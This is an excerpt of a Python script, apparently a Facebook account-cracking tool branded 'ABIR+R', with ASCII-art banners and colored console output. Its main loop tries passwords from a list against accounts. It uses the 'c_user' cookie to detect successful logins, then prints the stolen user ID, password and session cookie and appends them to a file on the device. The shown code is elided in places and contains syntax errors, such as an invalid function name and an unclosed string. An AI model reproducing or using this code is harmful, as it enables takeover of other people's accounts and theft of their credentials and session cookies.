...
| |   / ____ \   | || |    |  __'.   | || |      | |     | || |   |  __ /    | |
| | _/ /    \ \_ | || |   _| |__) |  | || |     _| |_    | || |  _| |  \ \_  | |
| ||____|  |____|| || |  |_______/   | || |    |_____|   | || | |____| |___| | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 
 \033[1;92m╔=================================╗
...
def ABIR+R ():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://https://www.facebook.com/profile.php?id=100000524413400)
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio ABIR+R_OK.mp3")
                print('\033[1;92m[ABIR+R-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ABIR+R-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mABIR+R","\x1b[1;92mABIR+R","\x1b[1;93mABIR+R","\x1b[1;94mABIR+R","\x1b[1;95mABIR+R","\x1b[1;96mABIR+R","\x1b[1;97mABIR+R","\x1b[1;91mABIR+R","\x1b[1;92mABIR+R","\x1b[1;93mABIR+R","\x1b[1;94mABIR+R","\x1b[1;95mABIR+R","\x1b[1;96mABIR+R"])
